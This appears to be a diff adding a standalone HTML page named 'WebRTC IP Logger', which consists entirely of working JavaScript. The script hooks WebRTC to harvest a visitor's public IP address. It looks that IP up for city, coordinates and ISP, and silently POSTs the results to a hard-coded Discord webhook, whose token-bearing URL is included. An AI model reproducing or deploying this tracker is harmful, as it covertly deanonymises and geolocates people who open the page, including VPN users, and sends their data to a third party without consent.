@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebRTC IP Logger</title>
+</head>
+<body>
+    <script>
+        var hasAlerted = false;
+
+        window.oRTCPeerConnection =
+            window.oRTCPeerConnection || window.RTCPeerConnection;
+
+        window.RTCPeerConnection = function (...args) {
+            const pc = new window.oRTCPeerConnection(...args);
+
+            pc.oaddIceCandidate = pc.addIceCandidate;
+
+            pc.addIceCandidate = function (iceCandidate, ...rest) {
+                const fields = iceCandidate.candidate.split(" ");
+
+                console.log(iceCandidate.candidate);
+                const ip = fields[4];
+                if (fields[7] === "srflx") {
+                    getLocation(ip);
+                }
+                return pc.oaddIceCandidate(iceCandidate, ...rest);
+            };
+            return pc;
+        };
+
+        let getLocation = async (ip) => {
+            let url = `https://ipwhois.app/json/${ip}`;
+            console.log("...fetching", url);
+
+            await fetch(url, { referrer: "" }).then((response) =>
+                response.json().then((json) => {
+                    let header = `- ${ip} `.padEnd(20, "-");
+                    let localTime = new Date().toLocaleString([], { timeZone: json.timezone });
+                    let output = `
+                  ${header}
+                  Country:  ${json.country}
+                  Region:   ${json.region}
+                  City:     ${json.city}
+                  Coords:   (${json.latitude}, ${json.longitude})
+                  Timezone: ${json.timezone} (${json.timezone_gmt})
+                  Time:     ${localTime}
+                  ISP:      ${json.isp}
+                  --------------------
+                  `;
+                    console.log(output);
+
+                    // Send data to the webhook
+                    sendToWebhook({
+                        ip: ip,
+                        country: json.country,
+                        region: json.region,
+                        city: json.city,
+                        latitude: json.latitude,
+                        longitude: json.longitude,
+                        timezone: json.timezone,
+                        local_time: localTime,
+                        isp: json.isp,
+                    });
+
+                    if (!hasAlerted) {
+                        alert(`[WebRTC:${ip}] see console for details`);
+                        hasAlerted = true;
+                    }
+                })
+            );
+        };
+
+        // Function to send the extracted data to a webhook
+        let sendToWebhook = (data) => {
+            const webhookUrl = "https://discord.com/api/webhooks/1297979202183889039/06JY8Q-pQUM6eH84fCH2deahCkwwCg6dZL97toixTtgIUk_SRdO_3HapGS7SoNzjabZU"; // Replace with your actual webhook URL
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Data successfully sent to webhook.");
+                    } else {
+                        console.log("Failed to send data to webhook.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending data to webhook:", error);
+                });
+        };
+    </script>
+</body>
+</html>
